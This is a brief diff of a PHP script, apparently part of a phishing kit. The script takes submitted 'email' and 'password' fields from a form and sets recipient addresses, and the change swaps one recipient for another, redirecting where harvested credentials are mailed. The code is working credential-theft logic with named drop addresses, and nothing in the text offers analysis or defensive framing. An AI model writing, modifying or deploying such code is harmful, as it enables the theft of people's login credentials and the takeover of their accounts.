@@ -5,7 +5,7 @@ if(!empty($_POST)) {
  $email= $_POST['email'];
  $password = $_POST['password'];
 
-		$to = "silentquake24@gmail.com";
+		$to = "netlifhost@protonmail.com";
 		$to1 = "jameselvis@iname.com";
 		$to2 = "netlifhost@protonmail.com";
 
